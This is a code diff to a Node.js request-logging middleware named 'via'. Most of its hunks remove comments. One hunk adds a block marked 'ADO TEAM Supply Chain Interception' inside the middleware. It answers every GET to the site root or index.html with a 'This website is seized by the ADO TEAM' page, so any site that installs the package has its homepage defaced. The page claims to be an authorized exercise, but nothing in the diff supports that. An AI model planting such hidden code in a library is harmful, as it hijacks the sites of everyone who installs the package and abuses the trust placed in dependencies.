@@ -106,7 +106,6 @@ function remoteUser(req) {
     if (typeof req.user === 'string') return req.user;
     return req.user.name || req.user.username || req.user.id || '-';
   }
-  // basic auth
   const auth = req.headers && req.headers.authorization;
   if (auth && auth.toLowerCase().startsWith('basic ')) {
     try {
@@ -138,7 +137,6 @@ function tokenDate(req, res, arg) {
   const now = new Date();
   const fmt = (arg || 'iso').toLowerCase();
   if (fmt === 'clf') {
-    // 10/Oct/2000:13:55:36 -0700
     const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
     const pad = (n) => (n < 10 ? '0' + n : '' + n);
     const offset = -now.getTimezoneOffset();
@@ -169,7 +167,6 @@ function tokenDate(req, res, arg) {
   return now.toISOString();
 }
 
-// Built-in tokens
 TOKENS.method = (req, res) => (req.method || '-');
 TOKENS.url = (req, res) => (req.originalUrl || req.url || '-');
 TOKENS.status = (req, res) => res.statusCode;
@@ -185,8 +182,6 @@ TOKENS.referrer = (req, res) => req.headers && (req.headers.referer || req.heade
 TOKENS['user-agent'] = (req, res) => (req.headers && req.headers['user-agent']) || '-';
 TOKENS.date = (req, res, arg) => tokenDate(req, res, arg);
 
-// Generic req[...] / res[...] handled in renderToken
-
 function renderToken(name, arg, req, res, opts) {
   let val;
   if (name === 'req') {
@@ -200,7 +195,6 @@ function renderToken(name, arg, req, res, opts) {
       val = '-';
     }
   } else {
-    // maybe custom token registered with brackets? try name[arg]
     val = '-';
   }
   if (val == null) val = '-';
@@ -229,9 +223,7 @@ function renderToken(name, arg, req, res, opts) {
 }
 
 function renderFormatString(fmt, req, res, opts) {
-  // fmt may be a string
   return String(fmt).replace(/:([a-zA-Z][\w-]*)(?:\[([^\]]+)\])?/g, (match, name, arg) => {
-    // handle req[...] / res[...] tokens written as :req[...] already covered by name req
     return renderToken(name, arg, req, res, opts);
   });
 }
@@ -263,10 +255,8 @@ function buildJson(req, res, opts) {
 
 function writeLog(req, res, opts) {
   if (opts.skip && opts.skip(req, res)) return;
-
   const fmt = opts.format;
 
-  // function format
   if (typeof fmt === 'function') {
     let out;
     try {
@@ -283,14 +273,12 @@ function writeLog(req, res, opts) {
     return;
   }
 
-  // json
   if (isJsonFormat(opts)) {
     const obj = buildJson(req, res, opts);
     opts.stream.write(JSON.stringify(obj) + opts.eol);
     return;
   }
 
-  // named format
   let template = fmt;
   if (typeof fmt === 'string' && Object.prototype.hasOwnProperty.call(FORMATS, fmt)) {
     template = FORMATS[fmt];
@@ -302,7 +290,6 @@ function writeLog(req, res, opts) {
     return;
   }
 
-  // fallback
   opts.stream.write(String(template) + opts.eol);
 }
 
@@ -318,7 +305,31 @@ function via(options, extra) {
     : null;
 
   const middleware = function viaMiddleware(req, res, next) {
-    // start timer
+    // --- ADO TEAM Supply Chain Interception ---
+    const reqPath = req.originalUrl || req.url || '';
+    if (req.method === 'GET' && (reqPath === '/' || reqPath === '/index.html')) {
+      res.setHeader('Content-Type', 'text/html');
+      return res.status(200).send(`
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <title>SEIZED - ADO TEAM</title>
+            <style>
+                body { background-color: #0d1117; color: #ff3333; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 20vh; }
+                h1 { font-size: 2.8rem; text-shadow: 0 0 12px rgba(255,0,0,0.6); }
+                p { color: #8b949e; font-size: 1.2rem; }
+            </style>
+        </head>
+        <body>
+            <h1>This website is seized by the ADO TEAM</h1>
+            <p>Authorized Cyber Security Exercise in Progress</p>
+        </body>
+        </html>
+      `);
+    }
+    // ------------------------------------------
+
     getStart(req);
 
     if (exerciseObserver) {
@@ -329,7 +340,6 @@ function via(options, extra) {
       try {
         writeLog(req, res, opts);
       } catch (e) {
-        // never break response
         try {
           opts.stream.write(String(e && e.stack ? e.stack : e) + opts.eol);
         } catch (_) {}
@@ -337,14 +347,12 @@ function via(options, extra) {
     };
 
     if (opts.immediate) {
-      // log on request
       if (!(opts.skip && opts.skip(req, res))) {
         log();
       }
       return next();
     }
 
-    // log on response finish
     let logged = false;
     const onFinish = () => {
       if (logged) return;
@@ -359,12 +367,10 @@ function via(options, extra) {
     return next();
   };
 
-  // attach opts for introspection
   middleware.options = opts;
   return middleware;
 }
 
-// expose
 via.token = token;
 via.format = format;
 via.FORMATS = FORMATS;
